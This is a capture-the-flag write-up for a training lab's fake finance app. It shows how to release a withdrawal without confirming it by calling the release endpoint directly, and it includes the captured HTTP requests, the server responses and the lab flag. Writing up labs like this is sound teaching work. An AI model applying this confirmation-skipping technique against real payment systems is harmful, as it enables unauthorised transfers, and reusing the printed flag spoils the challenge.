# Shady Oaks Financial - Multi-step sequences are always buggy.

The lab provides several features, including:

* `/dashboard`
* `/trading`
* `/portfolio`
* `/exchange`
* `/withdraw`
* `/history`
* `/forecast`
* `/alerts`

The vulnerability was found in the **withdrawal workflow**.

---

## 1. Investigate the Withdrawal Function

Navigate to:

```text
/withdraw
```

Create a small withdrawal, for example:

```text
Amount: 1 EUR
IBAN: DE00 0000 0000 0000
```

Capture the request using **Burp Suite → Proxy → HTTP history**.

The request was:

```http
POST /api/payouts
Content-Type: application/json

{
  "amount": 1,
  "iban": "DE00 0000 0000 0000"
}
```

The server responded:

```json
{
  "id": 1,
  "status": "initiated",
  "message": "Withdrawal initiated. Confirm it to authorise the transfer."
}
```

This revealed the first state of the withdrawal:

```text
initiated
```

---

## 2. Observe the Confirmation Step

The normal application workflow provides a **Confirm** button.

After entering the withdrawal password, the application sends:

```http
POST /api/payouts/1/confirm
Content-Type: application/json

{
  "password": "qwerty"
}
```

The server responded:

```json
{
  "id": 1,
  "status": "confirmed",
  "message": "Withdrawal confirmed."
}
```

Therefore, the intended workflow appeared to be:

```text
Initiated
    ↓
Confirmed
```

---

## 3. Observe the Release Step

After confirmation, the application provides a **Release** button.

Clicking it generated:

```http
POST /api/payouts/1/release
Content-Type: application/json

{}
```

The server responded:

```json
{
  "id": 1,
  "status": "released",
  "amount": 1,
  "message": "Withdrawal released to your bank account."
}
```

The complete intended sequence was therefore:

```text
POST /api/payouts
        ↓
initiated
        ↓
POST /api/payouts/{id}/confirm
        ↓
confirmed
        ↓
POST /api/payouts/{id}/release
        ↓
released
```

---

## 4. Test for a Broken State Transition

The challenge hint says:

> `Multi-step sequences are always buggy.`

This suggests testing whether the API actually enforces the required order of operations.

Create another small withdrawal, but **do not press Confirm**.

The new payout was:

```json
{
  "id": 2,
  "amount": 1,
  "status": "initiated"
}
```

At this point the expected state was:

```text
initiated
```

The application should require:

```text
initiated → confirmed → released
```

Instead, test the release endpoint directly.

---

## 5. Skip the Confirmation Step

Using **Burp Repeater**, send:

```http
POST /api/payouts/2/release HTTP/2
Host: lab-1789302799860-gnqeti.labs-app.bugforge.io
Authorization: Bearer <your-session-token>
Content-Type: application/json

{}
```

Notice that payout `2` was still:

```text
initiated
```

It had **never been confirmed**.

However, the server returned:

```json
{
  "id": 2,
  "status": "released",
  "amount": 1,
  "message": "Withdrawal released to your bank account.",
  "compliance_reference": "bug{qpuxl2GsPuRUEFBgUttTV48NzUCHFiNm}"
}
```

The release operation succeeded.

---

## 6. Identify the Vulnerability

The intended workflow was:

```text
initiated
    ↓
confirmed
    ↓
released
```

But the server allowed:

```text
initiated
    ↓
released
```

The `/api/payouts/{id}/release` endpoint failed to properly validate the payout's current state before performing the release operation.

This is a **broken multi-step workflow / improper state-transition validation** vulnerability.

---

## 7. Exploitation Flow

The vulnerable sequence can be summarized as:

```text
1. Create payout
        ↓
   POST /api/payouts
        ↓
   status = initiated
        ↓
2. Skip confirmation
        ↓
3. Directly call:
   POST /api/payouts/2/release
        ↓
4. Server accepts the request
        ↓
5. status = released
        ↓
6. Flag returned
```

### Vulnerable Request

```http
POST /api/payouts/2/release HTTP/2
Content-Type: application/json

{}
```

### Server Response

```json
{
  "id": 2,
  "status": "released",
  "amount": 1,
  "message": "Withdrawal released to your bank account.",
  "compliance_reference": "bug{qpuxl2GsPuRUEFBgUttTV48NzUCHFiNm}"
}
```

---

## 8. Flag

```text
bug{qpuxl2GsPuRUEFBgUttTV48NzUCHFiNm}
```

## 9. Vulnerability Summary

**Vulnerability:** Broken multi-step workflow / improper state-transition validation

**Affected endpoint:**

```text
POST /api/payouts/{id}/release
```

**Expected validation:**

```text
payout.status == "confirmed"
```

before allowing:

```text
released
```

**Actual behavior:**

```text
initiated → released
```

The application trusted the client to follow the intended sequence instead of enforcing the sequence server-side.